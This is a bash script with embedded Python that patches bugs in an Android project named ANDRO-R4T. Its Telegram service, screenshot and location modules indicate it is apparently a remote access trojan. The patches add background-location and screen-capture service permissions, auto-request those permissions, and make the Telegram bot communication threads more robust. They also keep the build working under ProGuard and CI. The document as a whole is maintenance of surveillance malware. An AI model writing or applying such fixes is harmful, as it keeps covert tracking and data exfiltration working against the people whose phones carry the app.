#!/usr/bin/env bash
# ============================================================================
#  ANDRO-R4T — script de correção de bugs
#  Uso:  ./fix-andro.sh  (na raiz do repositório)
#  Ambiente: Ubuntu (Termux/proot), bash >= 4, python3
# ============================================================================
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
log()  { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
err()  { echo -e "${RED}[-]${NC} $*" >&2; }
info() { echo -e "${CYAN}[i]${NC} $*"; }

# ----------------------------------------------------------------------------
# 0. Pré-checagens
# ----------------------------------------------------------------------------
if [ ! -d ".git" ] && [ -d "ANDRO-R4T" ]; then
    cd ANDRO-R4T
fi
if [ ! -d ".git" ]; then
    err "Execute na raiz do repositório ANDRO-R4T."
    exit 1
fi
if ! command -v python3 >/dev/null 2>&1; then
    err "python3 é obrigatório.  (pkg install python  |  apt install python3)"
    exit 1
fi

REPO_ROOT="$(pwd)"
BACKUP_DIR=".fix-backup-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$BACKUP_DIR"
log "Repositório : $REPO_ROOT"
log "Backup      : $BACKUP_DIR"

# ----------------------------------------------------------------------------
# 1. Executa os patches em Python
# ----------------------------------------------------------------------------
python3 - "$BACKUP_DIR" <<'PYEOF'
import os, re, sys, shutil, glob

BACKUP_DIR = sys.argv[1]
REPO = os.getcwd()
ERRORS = []

# ------------------------- utilitários --------------------------------------
def find(patterns):
    for p in patterns:
        r = glob.glob(os.path.join(REPO, '**', p), recursive=True)
        if r:
            return r[0]
    return None

def backup(path):
    if not path or not os.path.isfile(path):
        return
    rel = os.path.relpath(path, REPO)
    dst = os.path.join(BACKUP_DIR, rel)
    os.makedirs(os.path.dirname(dst), exist_ok=True)
    shutil.copy2(path, dst)

def read(p):
    with open(p, 'r', encoding='utf-8', errors='replace') as fp:
        return fp.read()

def write(p, s):
    with open(p, 'w', encoding='utf-8') as fp:
        fp.write(s)

def report(name, changed):
    if changed:
        print(f"    \033[0;32m✓\033[0m {name}")
    else:
        print(f"    \033[1;33m·\033[0m {name}  (já OK ou não aplicável)")

def balanced_replace_new_thread(src):
    """Substitui new Thread(<corpo>).start(); por EXEC.execute(<corpo>);"""
    out, i, replaced = [], 0, 0
    needle = 'new Thread('
    while True:
        idx = src.find(needle, i)
        if idx == -1:
            out.append(src[i:]); break
        out.append(src[i:idx])
        # parênteses balanceados após 'new Thread'
        j = idx + len('new Thread')
        depth = 0
        while j < len(src):
            c = src[j]
            if c == '(':
                depth += 1
            elif c == ')':
                depth -= 1
                if depth == 0:
                    j += 1
                    break
            j += 1
        rest = src[j:j+40]
        if re.match(r'\s*\.start\s*\(\s*\)\s*;', rest):
            end = src.find(';', j) + 1
            inner = src[idx + len(needle):j - 1]
            out.append(f'EXEC.execute({inner});')
            i = end
            replaced += 1
        else:
            out.append(src[idx:j]); i = j
    return ''.join(out), replaced

# ------------------------- localização dos arquivos -------------------------
main_act  = find(['MainActivity.java'])
shot_act  = find(['ShotActivity.java'])
tg_svc    = find(['TelegramService.java'])
tg_api    = find(['TgApi.java'])
mod_media = find(['ModMedia.java'])
manifest  = find(['src/main/AndroidManifest.xml', 'AndroidManifest.xml'])
proguard  = find(['proguard-rules.pro'])
workflow  = find(['.github/workflows/build.yml', 'build.yml'])

# ============================================================================
# PATCH 1 — AndroidManifest.xml
# ============================================================================
print("\n[1] AndroidManifest.xml")
if not manifest:
    print("    \033[0;31m✗\033[0m  não encontrado")
    ERRORS.append("manifest")
else:
    backup(manifest)
    s = read(manifest); orig = s

    # 1a. Permissões extra
    for perm in ('ACCESS_BACKGROUND_LOCATION',
                 'FOREGROUND_SERVICE',
                 'FOREGROUND_SERVICE_DATA_SYNC',
                 'FOREGROUND_SERVICE_MEDIA_PROJECTION'):
        full = f'android.permission.{perm}'
        if full not in s:
            tag = f'    <uses-permission android:name="{full}"/>\n'
            if '<application' in s:
                s = s.replace('<application', tag + '    <application', 1)
            else:
                s += tag

    # 1b. foregroundServiceType nos <service> relevantes
    for svc, typ in (('TelegramService', 'dataSync'),
                     ('ShotService', 'mediaProjection')):
        pat = re.compile(
            r'<service\b[^>]*android:name="[^"]*' + svc + r'"[^>]*>',
            re.DOTALL,
        )
        def add_type(m, _t=typ):
            tag = m.group(0)
            if 'foregroundServiceType' in tag:
                return tag
            if tag.endswith('/>'):
                return tag[:-2].rstrip() + f' android:foregroundServiceType="{_t}"/>'
            return tag[:-1].rstrip() + f' android:foregroundServiceType="{_t}">'
        s = pat.sub(add_type, s)

    report('AndroidManifest.xml', s != orig)
    if s != orig:
        write(manifest, s)

# ============================================================================
# PATCH 2 — MainActivity.java
# ============================================================================
print("\n[2] MainActivity.java")
if not main_act:
    print("    \033[1;33m·\033[0m  não encontrado")
else:
    backup(main_act)
    s = read(main_act); orig = s

    # 2a. ACCESS_BACKGROUND_LOCATION no array de permissões
    if 'ACCESS_BACKGROUND_LOCATION' not in s:
        for anchor in ('Manifest.permission.ACCESS_COARSE_LOCATION',
                       'Manifest.permission.ACCESS_FINE_LOCATION'):
            if anchor in s:
                s = s.replace(
                    anchor,
                    anchor + ',\n            Manifest.permission.ACCESS_BACKGROUND_LOCATION',
                    1,
                )
                break

    # 2b. Guarda de permissão: só pede se faltar alguma
    m = re.search(
        r'requestPermissions\s*\(\s*(new\s+String\s*\[\s*\]\s*\{[^}]*\})\s*,\s*(\d+)\s*\)\s*;',
        s,
    )
    if m and 'checkSelfPermission' not in s:
        arr, code = m.group(1), m.group(2)
        guard = (
            f'String[] __perms = {arr};\n'
            f'            boolean __need = false;\n'
            f'            for (String __p : __perms) {{\n'
            f'                if (checkSelfPermission(__p) '
            f'!= android.content.pm.PackageManager.PERMISSION_GRANTED) '
            f'{{ __need = true; break; }}\n'
            f'            }}\n'
            f'            if (__need) requestPermissions(__perms, {code});'
        )
        s = s[:m.start()] + guard + s[m.end():]

    report('MainActivity.java', s != orig)
    if s != orig:
        write(main_act, s)

# ============================================================================
# PATCH 3 — ShotActivity.java  (Scoped Storage)
# ============================================================================
print("\n[3] ShotActivity.java")
if not shot_act:
    print("    \033[1;33m·\033[0m  não encontrado")
else:
    backup(shot_act)
    s = read(shot_act); orig = s

    # Grava em armazenamento interno do app (não precisa permissão, Android 10+)
    replacements = [
        ('Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)',
         'getExternalFilesDir(Environment.DIRECTORY_PICTURES)'),
        ('new File(Environment.getExternalStorageDirectory(), "Download")',
         'getExternalFilesDir(null)'),
        ('new File("/sdcard/Download/', 'new File(getExternalFilesDir(null), "'),
        ('new File("/storage/emulated/0/Download/', 'new File(getExternalFilesDir(null), "'),
        ('new File("/sdcard/Download")', 'getExternalFilesDir(null)'),
    ]
    for old, new in replacements:
        s = s.replace(old, new)

    # Fallback: se ainda houver "/sdcard/Download" e não foi substituído, avisa
    if '/sdcard/Download' in s and '/sdcard/Download' in orig:
        print("    \033[1;33m!\033[0m  ainda há referência a /sdcard/Download — revise manualmente")

    report('ShotActivity.java', s != orig)
    if s != orig:
        write(shot_act, s)

# ============================================================================
# PATCH 4 — TelegramService.java  (validação token/chat vazios)
# ============================================================================
print("\n[4] TelegramService.java")
if not tg_svc:
    print("    \033[1;33m·\033[0m  não encontrado")
else:
    backup(tg_svc)
    s = read(tg_svc); orig = s
    patched = False

    # Padrão 1: TG_TOKEN.equals("TOKEN_FALLBACK") || TG_CHAT.equals("CHAT_FALLBACK")
    p1 = re.compile(
        r'if\s*\(\s*TG_TOKEN\.equals\("TOKEN_FALLBACK"\)\s*\|\|\s*'
        r'TG_CHAT\.equals\("CHAT_FALLBACK"\)\s*\)\s*\{'
    )
    p2 = re.compile(
        r'if\s*\(\s*"TOKEN_FALLBACK"\.equals\(TG_TOKEN\)\s*\|\|\s*'
        r'"CHAT_FALLBACK"\.equals\(TG_CHAT\)\s*\)\s*\{'
    )
    repl = (
        'if (TG_TOKEN == null || TG_TOKEN.isEmpty() || "TOKEN_FALLBACK".equals(TG_TOKEN) ||\n'
        '            TG_CHAT == null || TG_CHAT.isEmpty() || "CHAT_FALLBACK".equals(TG_CHAT)) {'
    )
    for pat in (p1, p2):
        new_s = pat.sub(repl, s)
        if new_s != s:
            s = new_s; patched = True; break

    # Fallback: não achou o padrão — adiciona método auxiliar
    if not patched and 'configOk' not in s:
        helper = (
            '\n    private boolean configOk() {\n'
            '        return TG_TOKEN != null && !TG_TOKEN.isEmpty()\n'
            '            && !"TOKEN_FALLBACK".equals(TG_TOKEN)\n'
            '            && TG_CHAT != null && !TG_CHAT.isEmpty()\n'
            '            && !"CHAT_FALLBACK".equals(TG_CHAT);\n'
            '    }\n'
        )
        idx = s.rfind('}')
        if idx > 0:
            s = s[:idx] + helper + s[idx:]
            patched = True

    report('TelegramService.java', s != orig)
    if s != orig:
        write(tg_svc, s)

# ============================================================================
# PATCH 5 — TgApi.java  (ExecutorService)
# ============================================================================
print("\n[5] TgApi.java")
if not tg_api:
    print("    \033[1;33m·\033[0m  não encontrado")
else:
    backup(tg_api)
    s = read(tg_api); orig = s

    if 'ExecutorService' not in s:
        # import
        if 'import java.util.concurrent' not in s:
            s = re.sub(r'(^import\s+)',
                       r'\1java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\1',
                       s, count=1, flags=re.M)
        # campo estático
        m = re.search(r'(public\s+(?:final\s+)?class\s+TgApi\s*\{)', s)
        if m:
            s = s[:m.end()] + (
                '\n    private static final ExecutorService EXEC '
                '= Executors.newFixedThreadPool(2);\n'
            ) + s[m.end():]
        # substituir threads
        s, n = balanced_replace_new_thread(s)
        if n == 0:
            print("    \033[1;33m!\033[0m  nenhum `new Thread(...).start()` casou — revise manualmente")

    report('TgApi.java', s != orig)
    if s != orig:
        write(tg_api, s)

# ============================================================================
# PATCH 6 — ModMedia.java  (guard contra race no removeUpdates)
# ============================================================================
print("\n[6] ModMedia.java")
if not mod_media:
    print("    \033[1;33m·\033[0m  não encontrado")
else:
    backup(mod_media)
    s = read(mod_media); orig = s
    if 'removeUpdates' in s and '/* safe-remove */' not in s:
        s = re.sub(
            r'(\w+)\.removeUpdates\s*\(\s*(\w+)\s*\)\s*;',
            r'/* safe-remove */ try { \1.removeUpdates(\2); } catch (Exception ignored) {}',
            s,
        )
    report('ModMedia.java', s != orig)
    if s != orig:
        write(mod_media, s)

# ============================================================================
# PATCH 7 — proguard-rules.pro
# ============================================================================
print("\n[7] proguard-rules.pro")
if not proguard:
    print("    \033[1;33m·\033[0m  não encontrado")
else:
    backup(proguard)
    s = read(proguard) if os.path.isfile(proguard) else ''
    orig = s
    if 'ANDRO-R4T fix' not in s:
        s += (
            '\n# === ANDRO-R4T fix: regras keep ===\n'
            '-keep class * extends android.app.Service { *; }\n'
            '-keep class * extends android.content.BroadcastReceiver { *; }\n'
            '-keep class * extends android.app.Activity { *; }\n'
            '-keep class * extends android.content.ContentProvider { *; }\n'
            '-keep class * implements android.os.Parcelable { *; }\n'
            '-keep class * implements java.io.Serializable { *; }\n'
            '-keepclasseswithmembers class * {\n'
            '    public static void main(java.lang.String[]);\n'
            '}\n'
            '-keepattributes Signature, InnerClasses, EnclosingMethod,\\\n'
            '                RuntimeVisibleAnnotations, RuntimeVisibleParameterAnnotations\n'
        )
    report('proguard-rules.pro', s != orig)
    if s != orig:
        write(proguard, s)

# ============================================================================
# PATCH 8 — .github/workflows/build.yml
# ============================================================================
print("\n[8] GitHub Actions workflow")
if not workflow:
    print("    \033[1;33m·\033[0m  não encontrado")
else:
    backup(workflow)
    s = read(workflow); orig = s
    s = s.replace('continue-on-error: true',  'continue-on-error: false')
    s = s.replace('continue-on-error: True',  'continue-on-error: false')
    # Bônus: forçar falha visível no Gradle
    s = re.sub(r'(\./gradlew\s+assembleDebug[^\n]*)', r'\1 || exit 1', s)
    report('build.yml', s != orig)
    if s != orig:
        write(workflow, s)

print("\n" + "=" * 60)
if ERRORS:
    print(f"\033[0;31m[!] Avisos: arquivos não encontrados — {', '.join(ERRORS)}\033[0m")
print("\033[0;32m[✓] Patches concluídos.\033[0m")
PYEOF

# ----------------------------------------------------------------------------
# 2. Ajustes extras (gitignore + chmod)
# ----------------------------------------------------------------------------
if [ -f .gitignore ] && ! grep -q '.fix-backup' .gitignore 2>/dev/null; then
    echo ".fix-backup-*/" >> .gitignore
    log ".gitignore: pasta de backup ignorada"
fi
[ -f gradlew ] && chmod +x gradlew && log "gradlew: permissão de execução OK"

# ----------------------------------------------------------------------------
# 3. Resumo do diff
# ----------------------------------------------------------------------------
if command -v git >/dev/null 2>&1; then
    echo
    log "Resumo do git diff:"
    git --no-pager diff --stat 2>/dev/null || true
fi

echo
log "Concluído. Backup em: $BACKUP_DIR"
info "Revise com:  git diff"
info "Compile com: ./gradlew assembleDebug"
info "Reverter:    cp -rv $BACKUP_DIR/. .   &&   git checkout -- . "
